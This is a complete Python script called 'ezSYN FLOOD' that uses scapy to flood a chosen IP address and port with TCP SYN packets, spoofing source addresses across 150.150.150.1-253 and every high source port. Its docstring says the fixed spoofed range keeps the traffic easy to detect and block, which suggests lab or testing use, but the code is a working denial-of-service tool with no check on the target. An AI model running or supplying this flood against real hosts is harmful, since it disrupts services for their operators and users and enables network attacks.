
"""ezSYN FLOOD.

Usage:
  ezSYN_FLOOD.py <dst_ip> <dst_port> [--sleep=<sec>] [--verbose] [--very-verbose]

Options:
  -h, --help            Show options.
  --version             Version.
  --sleep=<seconds>     Seconds to sleep between shots [default: 0].
  --verbose             Addresses being spoofed [default: False].
  --very-verbose        Display everything [default: False].

Attacks wil originate from an address that looks like this 150.150.150.X to make it easily detected and blocked. 
X will go from 1 to 254. 

"""
from docopt import docopt
import logging
import signal
import sys
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *


def main(arguments):
    src_net = "150.150.150."
    dst_ip = arguments["<dst_ip>"]
    dst_port = int(arguments["<dst_port>"])
    sleep = int(arguments["--sleep"])
    verbose = arguments["--verbose"]
    very_verbose = arguments["--very-verbose"]

    signal.signal(signal.SIGINT, lambda n, f: sys.exit(0))

    print("\n###########################################")
    print("# Starting SYN TCP flood...")
    print("# Shooting at: {dst_ip}".format(dst_ip=dst_ip))
    print("###########################################\n")
    for src_host in range(1,254):
        if verbose or very_verbose:
            print("[*] We are sending spoofed SYN packets from {src_net}{src_host}".format(src_net=src_net,src_host=src_host))
            print("--------------------------------------------")

        for src_port in range(1024, 65535):
            if very_verbose:
                print("[+] Sending a spoofed SYN packet from {src_net}{src_host}:{src_port}".format(src_net=src_net,src_host=src_host,src_port=src_port))

            # Build the packet
            src_ip = src_net + str(src_host)
            network_layer = IP(src=src_ip, dst=dst_ip)
            transport_layer = TCP(sport=src_port, dport=dst_port, flags="S")

            # Send the packet
            send(network_layer/transport_layer, verbose=False)

            if sleep != 0:
                time.sleep(sleep)

    print("[+] Flooding done.")


if __name__ == '__main__':
    arguments = docopt(__doc__, version='ezSYN FLOOD 1.0')
    main(arguments)
